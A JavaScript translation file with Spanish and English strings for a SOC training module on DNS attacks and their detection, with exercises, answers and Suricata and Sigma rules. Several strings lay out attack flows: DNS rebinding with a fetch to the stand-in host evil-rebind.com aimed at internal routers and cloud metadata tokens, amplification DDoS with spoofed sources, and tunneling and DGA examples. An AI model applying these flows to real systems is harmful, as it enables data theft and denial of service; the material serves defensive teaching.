/* ============================================================
   i18n-dns.js — Traducciones EN del modulo DNS
   Protocolos Red SOC · @xavimape
   ============================================================
   Requiere que i18n-core.js este cargado antes (usa i18n.register).
   ============================================================ */

'use strict';

i18n.register({
      'dns.subtitle': "Domain Name System · UDP/53 · Application Layer",
      'dns.demo.title': "DNS Simulator",
      'dns.demo.label.domain': "Domain to resolve:",
      'dns.demo.label.type': "Query type:",
      'dns.demo.btn.run': "▶ Resolve",
      'dns.demo.poison.title': "⚠️ Demo: DNS Cache Poisoning",
      'dns.demo.cache.before': "🟢 Cache before attack",
      'dns.demo.cache.after': "🔴 Cache after attack",
      'dns.demo.btn.poison': "💉 Simulate Attack",
      'dns.demo.waiting': "Waiting for DNS query...",
      'dns.demo.response.title': "DNS Response",
      'dns.demo.poison.desc':  { es: 'El atacante introduce un registro falso en la caché del resolver. Las consultas futuras devuelven la IP del atacante sin hacer consulta al servidor autoritativo.',
                                en: 'The attacker inserts a forged record into the resolver cache. Future queries return the attacker\'s IP without contacting the authoritative server.' },
      'dns.demo.poison.waiting': "Waiting for attack...",
      'dns.demo.btn.resetcache': "↺ Reset cache",
      'dns.demo.tunnel.title': "🕳️ Demo: DNS Tunneling (Exfiltration)",
      'dns.demo.tunnel.desc':   { es: 'El atacante codifica datos en subdominios para exfiltrarlos sin levantar alertas de firewall. El tráfico DNS raramente está bloqueado.', en: 'The attacker encodes data in subdomains to exfiltrate it without triggering firewall alerts. DNS traffic is rarely blocked.' },
      'dns.demo.tunnel.label': "Message to exfiltrate:",
      'dns.demo.tunnel.btn': "📡 Simulate Tunneling",
      'dns.demo.tunnel.panel.q': "📤 Generated queries",
      'dns.demo.tunnel.panel.d': "🔍 Detection analysis",
      'dns.demo.dga.title': "🎲 Demo: DGA — Domain Generation Algorithm",
      'dns.demo.dga.desc':      { es: 'El malware genera dominios aleatorios para C2. Un analista SOC los identifica por su alta entropía y ausencia en resolvers legítimos.', en: 'Malware generates random domains for C2. A SOC analyst identifies them by high entropy and absence in legitimate resolvers.' },
      'dns.demo.dga.label': "Domain to analyze:",
      'dns.demo.dga.btn': "🔬 Analyze domain",
      'dns.demo.dga.panel.input': "🎯 Input",
      'dns.demo.dga.panel.result': "📊 Entropy analysis",
      'dns.demo.dga.examples': "Known DGA examples:",
      'dns.demo.opt.a': "A — IPv4 Address",
      'dns.demo.opt.aaaa': "AAAA — IPv6 Address",
      'dns.demo.opt.mx': "MX — Mail server",
      'dns.demo.opt.txt': "TXT — Arbitrary text",
      'dns.demo.opt.cname': "CNAME — Alias",
      'dns.tbl.domain': "Domain",
      'dns.tbl.type': "Type",
      'dns.tbl.ipval': "IP / Value",
      'dns.s1.title': "What is DNS?",
      'dns.s1.sub': "The phonebook of the Internet",
      'dns.s2.title': "How it works: the resolution flow",
      'dns.s2.sub': "5 steps from query to answer",
      'dns.s3.title': "DNS Record Types",
      'dns.s3.sub': "The most relevant for a SOC",
      'dns.s4.title': "Attack 1: DNS Spoofing / Cache Poisoning",
      'dns.s4.sub': "The attacker forges the resolver response",
      'dns.s5.title': "Attack 2: DNS Tunneling",
      'dns.s5.sub': "Data exfiltration using DNS queries",
      'dns.s6.title': "Attack 3: DGA (Domain Generation Algorithm)",
      'dns.s6.sub': "Malware generates pseudo-random domains to evade blocks",
      'dns.s7.title': "Attack 4: Malicious Domains and Phishing",
      'dns.s7.sub': "Typosquatting, homoglyph and lookalike domains",
      'dns.s8.title': "How it looks in SOC telemetry",
      'dns.s8.sub': "DNS in Zeek, Suricata and SIEM logs",
      'dns.s9.title': "Detection and mitigation",
      'dns.s9.sub': "Operational summary for SOC",
      'dns.ej1.title': "What does a recursive resolver do?",
      'dns.ej2.title': "DNS Records for SOC",
      'dns.ej3.title': "Log analysis — Identify the attack",
      'dns.ej4.title': "DGA — Entropy analysis",
      'dns.ej5.title': "Write a detection rule",
      'dns.challenge.title': "Incident #DNS-001: \"The employee unknowingly exfiltrating data\"",
      'dns.challenge.q': "What happened? What do you do now?",
      'dns.s1.p1': "DNS (Domain Name System) translates human-readable domain names —like <code>google.com</code>— into IP addresses that routers can forward. Without DNS, we'd have to memorize IPs for every service.",
      'dns.s1.callout':{ es: '<strong>Puerto y protocolo:</strong> UDP/53 para consultas (≤512 bytes). TCP/53 para respuestas grandes o transferencias de zona (AXFR).',
                        en: '<strong>Port and protocol:</strong> UDP/53 for queries (≤512 bytes). TCP/53 for large responses or zone transfers (AXFR).' },
      'dns.s1.p2': "DNS operates hierarchically and is distributed: there is no single server that knows everything, but a chain of servers that collaborate to resolve each name.",
      'dns.s2.callout':{ es: '<strong>TTL (Time To Live):</strong> cuántos segundos puede el resolver guardar la respuesta en caché antes de volver a preguntar. Un TTL bajo = más tráfico DNS.',
                        en: '<strong>TTL (Time To Live):</strong> how many seconds the resolver can cache the response before querying again. A low TTL = more DNS traffic.' },
      'dns.s3.li1': "<code>A</code> — Name → IPv4 (most common)",
      'dns.s3.li2': "<code>AAAA</code> — Name → IPv6",
      'dns.s3.li3': "<code>CNAME</code> — Alias → another name",
      'dns.s3.li4': "<code>MX</code> — Mail server",
      'dns.s3.li5': "<code>TXT</code> — Arbitrary text (SPF, DKIM, verification)",
      'dns.s3.li6': "<code>PTR</code> — IP → Name (reverse DNS, useful in forensics)",
      'dns.s3.li7': "<code>NS</code> — Authoritative zone server",
      'dns.s3.li8': "<code>SOA</code> — Start of Authority (zone metadata)",
      'dns.s3.callout':{ es: '<strong>Relevancia SOC:</strong> los registros TXT y consultas excesivas a subdominios son señales comunes de DNS Tunneling y C2 sobre DNS.',
                        en: '<strong>SOC relevance:</strong> TXT records and excessive subdomain queries are common indicators of DNS Tunneling and DNS-based C2.' },
      'dns.s4.p1': "The attacker sends a forged DNS response to the resolver before the legitimate one arrives, inserting their IP into the cache. All future queries for that domain are redirected to the attacker.",
      'dns.s4.callout':{ es: '<strong>Mecanismo:</strong> Kaminsky Attack (2008) — el atacante inunda el resolver con respuestas falsas para diferentes subdominios hasta que una coincide con el ID de transacción correcto.',
                        en: '<strong>Mechanism:</strong> Kaminsky Attack (2008) — the attacker floods the resolver with forged responses for different subdomains until one matches the correct transaction ID.' },
      'dns.s4.detect': "<strong>How to detect it in SOC:</strong>",
      'dns.s4.li1': "DNS responses with abnormally high or low TTL",
      'dns.s4.li2': "Response IP in an unexpected range for that domain",
      'dns.s4.li3': "Multiple responses to the same query (race condition)",
      'dns.s4.li4': "Zeek logs: <code>dns.log</code> with <code>rcode=0</code> but unexpected IP",
      'dns.s5.p1': "The attacker encodes data in subdomains of their controlled domain. Malware on the victim makes normal DNS queries that bypass firewalls — but carry exfiltrated data.",
      'dns.s5.callout':{ es: '<strong>IOCs:</strong> subdominios de alta entropía (Base64/hex), longitud de consulta &gt;50 caracteres, volumen anormal de consultas TXT al mismo dominio base.',
                        en: '<strong>IOCs:</strong> high-entropy subdomains (Base64/hex), query length &gt;50 characters, abnormal TXT query volume to the same base domain.' },
      'dns.s5.tools': "<strong>Attacker tools:</strong> dnscat2, iodine, dns2tcp.",
      'dns.s6.p1': "The malware and C2 server use the same algorithm (DGA) with a shared seed (date, etc.) to generate hundreds of domains. Only one will be active — but the defender doesn't know which.",
      'dns.s6.callout':{ es: '<strong>Ejemplo DGA (pseudocódigo):</strong><br><code>seed = fecha_actual()</code><br><code>dominio = sha256(seed + contador)[:12] + ".com"</code><br>→ genera: <code>xk3mq7pzralc.com</code>, <code>9bv2nwtqfeld.com</code>...',
                        en: '<strong>DGA example (pseudocode):</strong><br><code>seed = current_date()</code><br><code>domain = sha256(seed + counter)[:12] + ".com"</code><br>→ generates: <code>xk3mq7pzralc.com</code>, <code>9bv2nwtqfeld.com</code>...' },
      'dns.s6.detect': "<strong>Detection:</strong> high domain name entropy, no resolution history, massive NXDomain (malware tries all DGA domains looking for the active one).",
      'dns.s7.p1': "The attacker registers domains similar to the legitimate one to deceive users or security tools.",
      'dns.s7.li1': "<strong>Typosquatting:</strong> <code>goggle.com</code>, <code>facbook.com</code>",
      'dns.s7.li2': "<strong>Homoglyph:</strong> <code>gооgle.com</code> (the \"o\" is Cyrillic)",
      'dns.s7.li3': "<strong>Lookalike:</strong> <code>paypa1.com</code>, <code>secure-bankofamerica-login.com</code>",
      'dns.s7.li4': "<strong>Fast Flux:</strong> the C2 domain changes its IP every few seconds to evade IP-based blocks",
      'dns.s7.callout':{ es: '<strong>SOC:</strong> integrar feeds de threat intel (AlienVault, Cisco Umbrella) para detección en tiempo real. Zeek + reglas Suricata para lookalike domains.',
                        en: '<strong>SOC:</strong> integrate threat intel feeds (AlienVault, Cisco Umbrella) for real-time detection. Zeek + Suricata rules for lookalike domains.' },
      'dns.s8.callout':{ es: '<strong>Campos clave Zeek dns.log:</strong> <code>query</code>, <code>qtype_name</code>, <code>rcode_name</code>, <code>answers</code>, <code>TTLs</code>, <code>rejected</code>.',
                        en: '<strong>Key Zeek dns.log fields:</strong> <code>query</code>, <code>qtype_name</code>, <code>rcode_name</code>, <code>answers</code>, <code>TTLs</code>, <code>rejected</code>.' },
      'dns.s9.li1': "🔒 <strong>DNSSEC</strong> — cryptographic signing of DNS records (prevents spoofing)",
      'dns.s9.li2': "📊 <strong>DNS Sinkholing</strong> — redirect known malicious domains to a controlled server",
      'dns.s9.li3': "📈 <strong>Entropy analysis</strong> — high entropy in subdomain = suspicious",
      'dns.s9.li4': "🔢 <strong>NXDOMAIN volume</strong> — spikes = possible DGA or reconnaissance",
      'dns.s9.li5': "⏱️ <strong>Abnormally low TTL</strong> — possible Fast Flux",
      'dns.s9.li6': "📏 <strong>Query length &gt;50 chars</strong> — possible tunneling",
      'dns.s9.li7': "🌐 <strong>RPZ (Response Policy Zone)</strong> — block malicious domains at the resolver",
      'dns.s9.callout':{ es: '<strong>Regla Sigma básica — DGA Detection:</strong><br><code>selection: dns.query|re: \'^[a-z0-9]{10,}\\.com$\'</code><br><code>condition: selection AND NOT dns.answers</code>',
                        en: '<strong>Basic Sigma rule — DGA Detection:</strong><br><code>selection: dns.query|re: \'^[a-z0-9]{10,}\\.com$\'</code><br><code>condition: selection AND NOT dns.answers</code>' },
      'dns.ej1.q': "Explain in your own words what happens when you type <code>bank.com</code> in the browser and your OS has no cached answer. Describe all the actors involved and the order in which they participate.",
      'dns.ej1.ans':   { es: '1. El SO consulta su caché local → no está.\n2. Envía consulta UDP/53 al resolver configurado (ej: 8.8.8.8).\n3. El resolver consulta un Root Server (13 grupos en todo el mundo).\n4. El Root responde: "pregunta al TLD .com".\n5. El resolver consulta el TLD .com → responde: "pregunta al NS de bank.com".\n6. El resolver consulta el NS autoritativo de bank.com.\n7. Recibe respuesta con la IP y TTL → la guarda en caché.\n8. Retorna la IP al cliente.',
                        en: '1. OS checks local cache → not found.\n2. Sends UDP/53 query to configured resolver (e.g., 8.8.8.8).\n3. Resolver queries a Root Server (13 groups worldwide).\n4. Root responds: "ask the .com TLD server".\n5. Resolver queries .com TLD → responds: "ask bank.com\'s NS".\n6. Resolver queries bank.com\'s authoritative NS.\n7. Receives response with IP and TTL → caches it.\n8. Returns IP to the client.' },
      'dns.ej2.q': "An analyst found during an incident that malware makes repetitive <strong>TXT</strong> queries to <code>c2domain.net</code>. Why would it use TXT and not A? What advantage does this give the attacker?",
      'dns.ej2.ans':   { es: 'Los registros TXT permiten datos arbitrarios de hasta 255 bytes por string.\nEl atacante usa TXT para:\n- Recibir comandos del C2 (el malware lee el TXT y lo interpreta como instrucción)\n- Exfiltrar datos más largos que los subdominios permiten\n- Pasar desapercibido: TXT es común en SPF, DKIM, verificaciones Google/AWS\n\nVentaja adicional: muchos firewalls permiten todo tráfico DNS (port 53 UDP)\nsin inspección profunda de contenido.',
                        en: 'TXT records allow arbitrary data up to 255 bytes per string.\nThe attacker uses TXT to:\n- Receive C2 commands (malware reads TXT and interprets it as instructions)\n- Exfiltrate longer data than subdomains allow\n- Stay hidden: TXT is common in SPF, DKIM, Google/AWS verifications\n\nAdditional advantage: many firewalls allow all DNS traffic (port 53 UDP)\nwithout deep content inspection.' },
      'dns.ej3.q': "Analyze the following <code>dns.log</code> excerpt from Zeek and answer: what type of attack/suspicious activity do you see? What IOCs do you identify?",
      'dns.ej3.ans':   { es: 'ATAQUE: DNS Tunneling (exfiltración de datos vía DNS TXT)\n\nIOCs identificados:\n1. Subdominios con alta entropía en Base64 (VGhpcyBpcyBzZWNyZXQ, etc.)\n   → decodificados: "This is secret", " data for test", "ing purposes", etc.\n2. Consultas repetitivas al mismo dominio base (exfil.attackerdomain.xyz)\n3. Tipo de consulta TXT (inusual en tráfico legítimo de usuario)\n4. Frecuencia alta: 5 consultas en 4 segundos\n5. Dominio "attackerdomain.xyz" no es un dominio legítimo conocido\n\nAcción recomendada: bloquear *.attackerdomain.xyz en el resolver,\nalertar en SIEM, iniciar investigación del host origen.',
                        en: 'ATTACK: DNS Tunneling (data exfiltration via DNS TXT)\n\nIdentified IOCs:\n1. High-entropy Base64 subdomains (VGhpcyBpcyBzZWNyZXQ, etc.)\n   → decoded: "This is secret", " data for test", "ing purposes", etc.\n2. Repetitive queries to the same base domain (exfil.attackerdomain.xyz)\n3. TXT query type (unusual in legitimate user traffic)\n4. High frequency: 5 queries in 4 seconds\n5. Domain "attackerdomain.xyz" is not a known legitimate domain\n\nRecommended action: block *.attackerdomain.xyz at the resolver,\nalert in SIEM, initiate investigation of the source host.' },
      'dns.ej4.q': "You have these domains in DNS logs with <code>rcode=NXDOMAIN</code>. Which are likely generated by a DGA? Justify your answer.",
      'dns.ej4.ans':   { es: 'DGA sospechosos: xk3mq7pzralc, 9bv2nwtqfeld, p4r8kzwqmxjt, mq7vbnx2plfc\n\nJustificación:\n1. Alta entropía: mezcla aleatoria de consonantes y números sin significado\n2. Longitud uniforme: 12 caracteres — patrón típico de DGA\n3. Todos retornan NXDOMAIN: el malware está "intentando" conectar con el C2\n   buscando el dominio activo de hoy\n4. Patrón temporal: si son del mismo host en corto tiempo, es DGA definitivo\n\nLos dominios legítimos tienen palabras reconocibles, subdominios coherentes\ncon la empresa, y raramente retornan NXDOMAIN de forma masiva.',
                        en: 'Likely DGA: xk3mq7pzralc, 9bv2nwtqfeld, p4r8kzwqmxjt, mq7vbnx2plfc\n\nJustification:\n1. High entropy: random mix of consonants and numbers with no meaning\n2. Uniform length: 12 characters — typical DGA pattern\n3. All return NXDOMAIN: malware is "trying" to connect to the C2\n   looking for today\'s active domain\n4. Temporal pattern: if from the same host in a short time, it\'s DGA\n\nLegitimate domains have recognizable words, coherent subdomains\nfor the company, and rarely return NXDOMAIN at scale.' },
      'dns.ej5.q': "Write a Suricata rule (in pseudocode or real format) to detect DNS Tunneling based on these signals: TXT queries to subdomains with more than 40 characters before the first dot.",
      'dns.ej5.ans':   { es: '# Regla Suricata — DNS Tunneling via TXT records\nalert dns any any -> any 53 (\n  msg:"ET DNS Tunneling - Long TXT query subdomain";\n  dns.query;\n  pcre:"/^[a-zA-Z0-9+\\/=]{40,}\\.[a-z0-9\\-]+\\.[a-z]{2,}$/";\n  dns.type:16;   # tipo TXT\n  threshold: type both, track by_src, count 3, seconds 60;\n  classtype:trojan-activity;\n  sid:9000002; rev:1;\n)\n\n# Alternativa Sigma (SIEM)\ntitle: DNS Tunneling via TXT - Long Subdomain\ndetection:\n  selection:\n    dns.question.type: \'TXT\'\n    dns.question.name|re: \'^[a-zA-Z0-9+/=]{40,}\\.\'\n  condition: selection\nlevel: high',
                        en: '# Suricata rule — DNS Tunneling via TXT records\nalert dns any any -> any 53 (\n  msg:"ET DNS Tunneling - Long TXT query subdomain";\n  dns.query;\n  pcre:"/^[a-zA-Z0-9+\\/=]{40,}\\.[a-z0-9\\-]+\\.[a-z]{2,}$/";\n  dns.type:16;   # TXT type\n  threshold: type both, track by_src, count 3, seconds 60;\n  classtype:trojan-activity;\n  sid:9000002; rev:1;\n)\n\n# Sigma alternative (SIEM)\ntitle: DNS Tunneling via TXT - Long Subdomain\ndetection:\n  selection:\n    dns.question.type: \'TXT\'\n    dns.question.name|re: \'^[a-zA-Z0-9+/=]{40,}\\.\'\n  condition: selection\nlevel: high' },
      'dns.challenge.ctx': { es: 'Recibiste una alerta de tu SIEM a las 3:47 AM. Un host interno (<code>192.168.10.45</code>) generó 847 consultas DNS en 15 minutos, todas a subdominios de <code>updates-service.info</code>. El firewall no bloqueó nada porque el puerto 53 UDP está permitido. No hay alertas de AV.',
                            en: 'Your SIEM triggered an alert at 3:47 AM. An internal host (<code>192.168.10.45</code>) generated 847 DNS queries in 15 minutes, all to subdomains of <code>updates-service.info</code>. The firewall blocked nothing because port 53 UDP is allowed. No AV alerts.' },
      'dns.challenge.ask': "Answer: (1) What attack/technique do you identify? (2) What is the first response step? (3) How do you determine what data left the network?",
      'dns.challenge.ans': { es: '(1) TÉCNICA: DNS Tunneling para exfiltración de datos (T1048.001 - MITRE ATT&CK)\n    - Subdominios Base64 codificados → datos exfiltrados\n    - 847 consultas TXT en 15 min = ~12KB de datos (estimado)\n    - IP final (45.33.32.156) = servidor C2 de Metasploit conocido\n\n(2) RESPUESTA INMEDIATA:\n    → Aislar 192.168.10.45 de la red (o bloquear DNS externo del host)\n    → Bloquear *.updates-service.info en el resolver DNS\n    → Escalar a Tier 2 / IR team\n    → Preservar logs de Zeek y tráfico del host (no apagar aún)\n\n(3) ANÁLISIS DE DATOS EXFILTRADOS:\n    → Extraer todos los subdominios del log DNS para ese host\n    → Decodificar Base64 de cada subdominio\n    → Concatenar en orden cronológico\n    → aGVsbG8 = "hello", d29ybGQ = "world" → "hello world this is..."\n    → Determinar qué archivos/datos tenía acceso el usuario en esa máquina\n\nNOTA: si el empleado no era consciente, puede ser malware instalado en su equipo\nsin su conocimiento. Revisar procesos activos, startup items, scheduled tasks.',
                            en: '(1) TECHNIQUE: DNS Tunneling for data exfiltration (T1048.001 - MITRE ATT&CK)\n    - Base64-encoded subdomains → exfiltrated data\n    - 847 TXT queries in 15 min = ~12KB of data (estimated)\n    - Final IP (45.33.32.156) = known Metasploit C2 server\n\n(2) IMMEDIATE RESPONSE:\n    → Isolate 192.168.10.45 from the network (or block external DNS for that host)\n    → Block *.updates-service.info at the DNS resolver\n    → Escalate to Tier 2 / IR team\n    → Preserve Zeek logs and host traffic (do not power off yet)\n\n(3) EXFILTRATED DATA ANALYSIS:\n    → Extract all DNS subdomains from the log for that host\n    → Base64-decode each subdomain\n    → Concatenate in chronological order\n    → aGVsbG8 = "hello", d29ybGQ = "world" → "hello world this is..."\n    → Determine what files/data the user had access to on that machine\n\nNOTE: if the employee was unaware, it may be malware installed on their machine\nwithout their knowledge. Review active processes, startup items, scheduled tasks.' },
      'dns.rec.rfc1035': "Original DNS specification. Defines the protocol structure, record types, and resolver behavior.",
      'dns.rec.rfc4033': "Security extensions for DNS. Cryptographic signing of records to prevent spoofing and cache poisoning.",
      'dns.rec.dig': "Standard tool for manual DNS queries. Shows the complete resolution process.",
      'dns.rec.wireshark': "DNS traffic analysis in network packet captures.",
      'dns.rec.zeek': "Network Security Monitor. Generates structured logs of all DNS traffic.",
      'dns.rec.mxtoolbox': "Online DNS record lookup, blacklist checking, and configuration diagnostics.",
      'dns.rec.kaminsky': "Vulnerability in the source port randomness of DNS queries. Enabled practical cache poisoning attacks. Fixed with source port randomization.",
      'dns.rec.sigred': "Buffer overflow in Windows DNS Server. CVSS 10.0. Allows unauthenticated RCE via malicious DNS response.",
      'dns.rec.thm': "Hands-on introduction to the DNS protocol and its record types.",
      'dns.rec.t1071': "Command and Control technique via DNS. Includes examples of APT groups that use it.",
      'dns.rec.t1048': "Data exfiltration over alternative protocols — DNS as a covert channel.",
      'dns.cheat.signal': "Signal",
      'dns.cheat.cause': "Possible cause",
      'dns.cheat.action': "Action",
      'dns.cheat.r1.sig': "Massive NXDOMAIN from a single host",
      'dns.cheat.r1.cau': "DGA, reconnaissance",
      'dns.cheat.r1.act': "Correlate with intel, isolate if persistent",
      'dns.cheat.r2.sig': "Long Base64/hex subdomain",
      'dns.cheat.r2.cau': "DNS Tunneling, C2",
      'dns.cheat.r2.act': "Decode, block base domain, investigate host",
      'dns.cheat.r3.sig': "Repetitive TXT queries",
      'dns.cheat.r3.cau': "Tunneling, receiving C2 commands",
      'dns.cheat.r3.act': "Block at resolver, capture full traffic",
      'dns.cheat.r4.sig': { es: 'TTL muy bajo (<60s) con IP cambiante',       en: 'Very low TTL (<60s) with changing IP' },
      'dns.cheat.r4.cau': "Fast Flux, evasive C2",
      'dns.cheat.r4.act': "Log historical IPs, report domain",
      'dns.cheat.r5.sig': "Response with IP in unexpected range",
      'dns.cheat.r5.cau': "Cache Poisoning",
      'dns.cheat.r5.act': "Verify against authoritative server directly",
      'dns.cheat.r6.sig': "Queries to .onion, .bit, .i2p",
      'dns.cheat.r6.cau': "Malware, TOR, darknet",
      'dns.cheat.r6.act': "Block at resolver, alert IR team",
      'dns.cheat.r7.sig': "DNS volume from internal server",
      'dns.cheat.r7.cau': "Tunneling or internal reconnaissance",
      'dns.cheat.r7.act': "Review which process generates the queries",
      'dns.rec.h.t1048': "T1048.001 — DNS Exfiltration",
      'dns.footer.prev': "← Main Hub",
      'dns.footer.next': "HTTP/HTTPS →",
    'dns.pre0': { es: `
# Zeek dns.log — consulta normal
ts=1719300000 uid=C1234 id.orig_h=192.168.1.5 proto=udp
query=example.com qtype_name=A rcode_name=NOERROR answers=93.184.216.34 TTL=3600

# Zeek dns.log — posible DGA (subdominio de alta entropía)
query=xk3mq7pzralc.com qtype_name=A rcode_name=NXDOMAIN

# Suricata — alerta DNS Tunneling
alert dns any any -> any 53 (
  msg:"DNS Tunneling - High entropy subdomain";
  dns.query; content:".attacker.com";
  pcre:"/^[a-zA-Z0-9+\\/]{20,}\\.[^.]+\\.[^.]+$/";
  classtype:trojan-activity; sid:9000001; rev:1;)`, en: `
# Zeek dns.log — normal query
ts=1719300000 uid=C1234 id.orig_h=192.168.1.5 proto=udp
query=example.com qtype_name=A rcode_name=NOERROR answers=93.184.216.34 TTL=3600

# Zeek dns.log — possible DGA (high-entropy subdomain)
query=xk3mq7pzralc.com qtype_name=A rcode_name=NXDOMAIN

# Suricata — DNS Tunneling alert
alert dns any any -> any 53 (
  msg:"DNS Tunneling - High entropy subdomain";
  dns.query; content:".attacker.com";
  pcre:"/^[a-zA-Z0-9+\\/]{20,}\\.[^.]+\\.[^.]+$/";
  classtype:trojan-activity; sid:9000001; rev:1;)` },
    'dns.pre1': { es: `
FLUJO DEL ATAQUE:

Atacante (IP: 1.2.3.4, spoofeando 203.0.113.10):
  → Envía: DNS ANY isc.org?  [40 bytes, src=203.0.113.10]
  → A: 10.000 resolvers DNS abiertos

Cada resolver responde a la VICTIMA:
  → 203.0.113.10 recibe: 4.096 bytes de respuesta
  → ×10.000 resolvers = 40 GB/s sobre la víctima

FACTOR DE AMPLIFICACIÓN POR TIPO DE QUERY:
  ANY     → ×50-100x  (mayor, pero cada vez más bloqueado)
  TXT     → ×20-40x   (registros SPF/DKIM largos)
  RRSIG   → ×30-60x   (DNSSEC signatures)
  MX      → ×10-20x

DETECCIÓN:
  Zeek dns.log: mismo query repetido miles de veces con src IPs distintas
  NetFlow: volumen DNS saliente inusual desde resolver
  Alerta: resolver respondiendo a IPs que no consultaron

MITIGACIÓN:
  Resolver: BCP38 — filtrar paquetes con src IP spoofed
  ISP: uRPF (Unicast Reverse Path Forwarding)
  Resolver: Response Rate Limiting (RRL) en BIND/Unbound
  Deshabilitar consultas ANY en resolvers públicos`, en: `
ATTACK FLOW:

Attacker (IP: 1.2.3.4, spoofing 203.0.113.10):
  → Sends: DNS ANY isc.org?  [40 bytes, src=203.0.113.10]
  → To: 10,000 open DNS resolvers

Each resolver responds to the VICTIM:
  → 203.0.113.10 receives: 4,096 bytes of response
  → ×10,000 resolvers = 40 GB/s on the victim

AMPLIFICATION FACTOR BY QUERY TYPE:
  ANY     → ×50-100x  (highest, but increasingly blocked)
  TXT     → ×20-40x   (long SPF/DKIM records)
  RRSIG   → ×30-60x   (DNSSEC signatures)
  MX      → ×10-20x

DETECTION:
  Zeek dns.log: same query repeated thousands of times with different src IPs
  NetFlow: unusual outbound DNS volume from a resolver
  Alert: resolver responding to IPs that never queried

MITIGATION:
  Resolver: BCP38 — filter packets with spoofed src IP
  ISP: uRPF (Unicast Reverse Path Forwarding)
  Resolver: Response Rate Limiting (RRL) in BIND/Unbound
  Disable ANY queries on public resolvers` },
    'dns.pre2': { es: `
FLUJO DEL ATAQUE:

FASE 1 — Víctima visita evil-rebind.com:
  DNS query: evil-rebind.com → 1.2.3.4 (IP pública del atacante, TTL=1s)
  Navegador carga página con JavaScript malicioso

FASE 2 — TTL expira (1 segundo), DNS cambia:
  DNS query: evil-rebind.com → 192.168.1.1 (router interno!)
  Navegador: "evil-rebind.com sigue siendo el mismo dominio"
  → Same-Origin Policy satisfecha

FASE 3 — JavaScript hace fetch al "mismo dominio":
  fetch("http://evil-rebind.com/admin")
  → Navegador resuelve: 192.168.1.1/admin (router interno)
  → Respuesta enviada al servidor del atacante

OBJETIVOS COMUNES:
  192.168.1.1          → Panel admin del router (cambiar DNS)
  10.0.0.x:8080        → APIs internas sin autenticación
  169.254.169.254      → AWS/GCP/Azure metadata (tokens IAM)
  localhost:6379       → Redis sin auth → RCE

DETECCIÓN:
  DNS: TTL < 5 segundos en dominios externos → sospechoso
  Proxy: peticiones HTTP a IPs RFC1918 desde el navegador
  EDR: proceso browser conectando a 169.254.169.254

MITIGACIÓN:
  DNS rebind protection en routers (bloquear RFC1918 en DNS externo)
  Bind a localhost solo — no exponer servicios internos a 0.0.0.0
  Cabecera Host validation en APIs internas`, en: `
ATTACK FLOW:

PHASE 1 — Victim visits evil-rebind.com:
  DNS query: evil-rebind.com → 1.2.3.4 (attacker's public IP, TTL=1s)
  Browser loads a page with malicious JavaScript

PHASE 2 — TTL expires (1 second), DNS changes:
  DNS query: evil-rebind.com → 192.168.1.1 (internal router!)
  Browser: "evil-rebind.com is still the same domain"
  → Same-Origin Policy satisfied

PHASE 3 — JavaScript fetches the "same domain":
  fetch("http://evil-rebind.com/admin")
  → Browser resolves: 192.168.1.1/admin (internal router)
  → Response sent to the attacker's server

COMMON TARGETS:
  192.168.1.1          → Router admin panel (change DNS)
  10.0.0.x:8080        → Internal APIs without authentication
  169.254.169.254      → AWS/GCP/Azure metadata (IAM tokens)
  localhost:6379       → Redis without auth → RCE

DETECTION:
  DNS: TTL < 5 seconds on external domains → suspicious
  Proxy: HTTP requests to RFC1918 IPs from the browser
  EDR: browser process connecting to 169.254.169.254

MITIGATION:
  DNS rebind protection on routers (block RFC1918 in external DNS)
  Bind to localhost only — do not expose internal services on 0.0.0.0
  Host header validation on internal APIs` },
    'dns.opt1': "Homoglyph (pаypal.com — Cyrillic 'а')",
    'dns.opt2': "ANY (higher amplification)",
    'dns.opt3': "Internal API 10.0.0.5:8080",
    'dns.demo.phishing.title': "🎣 Demo: DNS Phishing — Deceptive Domains",
    'dns.demo.phishing.desc':      { es: 'Los atacantes registran dominios visualmente similares al legítimo para robar credenciales. DNS no autentica — cualquiera puede registrar paypa1.com.', en: 'Attackers register domains visually similar to the legitimate one to steal credentials. DNS does not authenticate — anyone can register paypa1.com.' },
    'dns.demo.phishing.panel': "Analyze suspicious domain",
    'dns.demo.phishing.domain': "Domain to analyze:",
    'dns.demo.phishing.technique': "Technique:",
    'dns.demo.phishing.btn': "🔍 Analyze domain",
    'dns.demo.phishing.result': "Domain analysis",
    'dns.demo.amp.title': "💥 Demo: DNS Amplification DDoS",
    'dns.demo.amp.desc':      { es: 'El atacante spoofea la IP origen (víctima) y usa resolvers abiertos como amplificadores. Factor típico ×50-100x.', en: 'The attacker spoofs the source IP (victim) and uses open resolvers as amplifiers. Typical factor ×50-100x.' },
    'dns.demo.amp.panel': "Configure amplification",
    'dns.demo.amp.victim': "Victim IP (spoofed src):",
    'dns.demo.amp.resolvers': "Open resolvers:",
    'dns.demo.amp.qtype': "Query type (amplification):",
    'dns.demo.amp.btn': "▶ Simulate amplification",
    'dns.demo.amp.result': "Attack flow",
    'dns.demo.rebind.title': "🔁 Demo: DNS Rebinding",
    'dns.demo.rebind.desc':   { es: 'El atacante controla un dominio con TTL muy bajo. Primero resuelve a IP pública, luego a IP interna. El navegador confía en el dominio y accede a servicios internos.', en: 'The attacker controls a domain with very low TTL. First resolves to public IP, then to internal IP. The browser trusts the domain and accesses internal services.' },
    'dns.demo.rebind.panel': "Configure rebinding",
    'dns.demo.rebind.domain': "Attacker domain:",
    'dns.demo.rebind.target': "Internal target:",
    'dns.demo.rebind.btn': "▶ Simulate rebinding",
    'dns.demo.rebind.result': "Attack flow",
    'dns.s10.title': "Attack 7: DNS Amplification DDoS",
    'dns.s10.sub': "Using open DNS resolvers as traffic amplifiers",
    'dns.s10.p1':    { es: 'El atacante spoofea la IP origen y envía consultas DNS a miles de resolvers abiertos. Cada resolver responde a la víctima con paquetes ×50-100x más grandes.', en: 'The attacker spoofs the source IP and sends DNS queries to thousands of open resolvers. Each resolver responds to the victim with packets ×50-100x larger.' },
    'dns.s11.title': "Attack 8: DNS Rebinding",
    'dns.s11.sub': "Same-Origin Policy bypass using short TTL",
    'dns.s11.p1':    { es: 'El atacante controla un dominio con TTL muy bajo. Primero resuelve a IP pública. Luego cambia a IP interna. El navegador sigue confiando en el dominio y ejecuta peticiones al interior de la red.', en: 'The attacker controls a domain with very low TTL. First resolves to public IP. Then changes to internal IP. The browser keeps trusting the domain and makes requests inside the network.' },
      'dns.ej6.title': "DNS Amplification: calculate the amplification factor",
